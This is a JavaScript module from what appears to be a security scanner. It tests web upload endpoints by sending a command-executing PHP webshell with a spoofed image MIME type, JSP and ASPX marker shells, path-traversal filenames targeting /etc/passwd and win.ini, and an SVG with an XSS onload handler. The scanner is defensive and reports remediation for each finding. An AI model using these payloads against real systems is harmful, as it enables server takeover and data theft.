// backend/src/tests/fileUploadTest.js
// File upload vulnerability detection
import axios from 'axios';
import { getSharedBrowser } from '../utils/screenshotCapture.js';

const WEBSHELL_PAYLOADS = {
    php: { content: '<?php echo "SECORA_WEBSHELL_CONFIRMED"; system($_GET["cmd"]); ?>', ext: '.php', mime: 'image/jpeg' },
    jsp: { content: '<%= "SECORA_WEBSHELL_CONFIRMED" %>', ext: '.jsp', mime: 'image/png' },
    aspx: { content: '<%@ Page Language="C#" %><% Response.Write("SECORA_WEBSHELL_CONFIRMED"); %>', ext: '.aspx', mime: 'image/gif' }
};

const PATH_TRAVERSAL_NAMES = ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini',
    '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'];

const SVG_XSS = `<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('SECORA_XSS')">
<text x="10" y="20">XSS via SVG</text></svg>`;

export async function testFileUpload(endpoint, options = {}) {
    const findings = [];
    const timeout = options.timeout || 15000;

    // Detect file upload endpoints
    let uploadEndpoints = [];

    if (endpoint.parameters) {
        const params = typeof endpoint.parameters === 'object' ? Object.keys(endpoint.parameters) : [];
        const fileParams = params.filter(p => /file|upload|image|avatar|photo|document|attachment|media/i.test(p));
        if (fileParams.length > 0) {
            uploadEndpoints.push({ url: endpoint.url, params: fileParams });
        }
    }

    // Also try to detect upload forms via Puppeteer
    try {
        const browser = await getSharedBrowser();
        const page = await browser.newPage();
        await page.goto(endpoint.url, { waitUntil: 'domcontentloaded', timeout });
        const fileInputs = await page.$$eval('input[type="file"]', inputs =>
            inputs.map(i => ({ name: i.name || 'file', form: i.form?.action || '' }))
        );
        if (fileInputs.length > 0) {
            uploadEndpoints.push({ url: endpoint.url, params: fileInputs.map(f => f.name), formBased: true });
        }
        await page.close().catch(() => {});
    } catch { /* no upload forms */ }

    if (uploadEndpoints.length === 0) return findings;

    for (const uploadEp of uploadEndpoints) {
        for (const param of uploadEp.params) {
            // Test 1: Webshell upload with MIME bypass
            for (const [lang, shell] of Object.entries(WEBSHELL_PAYLOADS)) {
                try {
                    const boundary = '----SecoraBoundary' + Date.now();
                    const body = [
                        `--${boundary}`,
                        `Content-Disposition: form-data; name="${param}"; filename="image${shell.ext}"`,
                        `Content-Type: ${shell.mime}`,
                        '',
                        shell.content,
                        `--${boundary}--`
                    ].join('\r\n');

                    const resp = await axios.post(uploadEp.url, body, {
                        timeout,
                        validateStatus: () => true,
                        headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` }
                    });

                    if (resp.status >= 200 && resp.status < 400) {
                        // Check if the upload was accepted
                        const respBody = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);
                        const uploaded = resp.status === 200 || resp.status === 201;

                        if (uploaded && !respBody.includes('error') && !respBody.includes('invalid')) {
                            findings.push({
                                assetId: endpoint.assetId, endpointId: endpoint.id,
                                title: `File Upload — ${lang.toUpperCase()} Webshell Accepted`,
                                description: `Endpoint accepts ${shell.ext} file with spoofed ${shell.mime} MIME type. Server-side execution may be possible.`,
                                category: 'SECURITY_MISCONFIG', severity: 'CRITICAL', cvss: 9.8,
                                owasp: 'A04:2021', cwe: 'CWE-434',
                                remediation: 'Validate file content (magic bytes), not just MIME type. Whitelist allowed extensions. Store uploads outside webroot. Disable script execution in upload directory.',
                                detectedBy: 'file-upload-engine', confidence: 80,
                                evidence: [
                                    { type: 'PAYLOAD', title: 'Webshell Upload', content: `Language: ${lang}\nFilename: image${shell.ext}\nMIME Type: ${shell.mime}\nContent: ${shell.content.substring(0, 100)}` },
                                    { type: 'RESPONSE', title: 'Upload Accepted', content: `Status: ${resp.status}\nResponse: ${respBody.substring(0, 300)}` }
                                ]
                            });
                            break;
                        }
                    }
                } catch { /* continue */ }
            }

            // Test 2: Path traversal in filename
            for (const traversalName of PATH_TRAVERSAL_NAMES) {
                try {
                    const boundary = '----SecoraBoundary' + Date.now();
                    const body = [
                        `--${boundary}`,
                        `Content-Disposition: form-data; name="${param}"; filename="${traversalName}"`,
                        'Content-Type: text/plain',
                        '',
                        'SECORA_PATH_TRAVERSAL_TEST',
                        `--${boundary}--`
                    ].join('\r\n');

                    const resp = await axios.post(uploadEp.url, body, {
                        timeout, validateStatus: () => true,
                        headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` }
                    });

                    if (resp.status >= 200 && resp.status < 400) {
                        findings.push({
                            assetId: endpoint.assetId, endpointId: endpoint.id,
                            title: 'File Upload — Path Traversal in Filename',
                            description: `Endpoint accepts files with path traversal sequences in filenames (${traversalName}). Files may be written outside the intended directory.`,
                            category: 'SECURITY_MISCONFIG', severity: 'HIGH', cvss: 8.1,
                            owasp: 'A01:2021', cwe: 'CWE-22',
                            remediation: 'Strip path separators from filenames. Use a generated filename, not user input. Validate upload destination.',
                            detectedBy: 'file-upload-engine', confidence: 70,
                            evidence: [
                                { type: 'PAYLOAD', title: 'Path Traversal', content: `Filename: ${traversalName}` },
                                { type: 'RESPONSE', title: 'Upload Response', content: `Status: ${resp.status}` }
                            ]
                        });
                        break;
                    }
                } catch { /* continue */ }
            }

            // Test 3: SVG with embedded XSS
            try {
                const boundary = '----SecoraBoundary' + Date.now();
                const body = [
                    `--${boundary}`,
                    `Content-Disposition: form-data; name="${param}"; filename="image.svg"`,
                    'Content-Type: image/svg+xml',
                    '',
                    SVG_XSS,
                    `--${boundary}--`
                ].join('\r\n');

                const resp = await axios.post(uploadEp.url, body, {
                    timeout, validateStatus: () => true,
                    headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` }
                });

                if (resp.status >= 200 && resp.status < 400) {
                    findings.push({
                        assetId: endpoint.assetId, endpointId: endpoint.id,
                        title: 'File Upload — SVG with Embedded XSS',
                        description: `Endpoint accepts SVG files containing JavaScript event handlers. If served to users, this enables stored XSS.`,
                        category: 'XSS', severity: 'MEDIUM', cvss: 5.4,
                        owasp: 'A03:2021', cwe: 'CWE-79',
                        remediation: 'Sanitize SVG files to remove script elements and event handlers. Serve uploaded SVGs with Content-Disposition: attachment.',
                        detectedBy: 'file-upload-engine', confidence: 65,
                        evidence: [
                            { type: 'PAYLOAD', title: 'SVG XSS', content: SVG_XSS },
                            { type: 'RESPONSE', title: 'Upload Accepted', content: `Status: ${resp.status}` }
                        ]
                    });
                }
            } catch { /* continue */ }
        }
    }
    return findings;
}

export default testFileUpload;
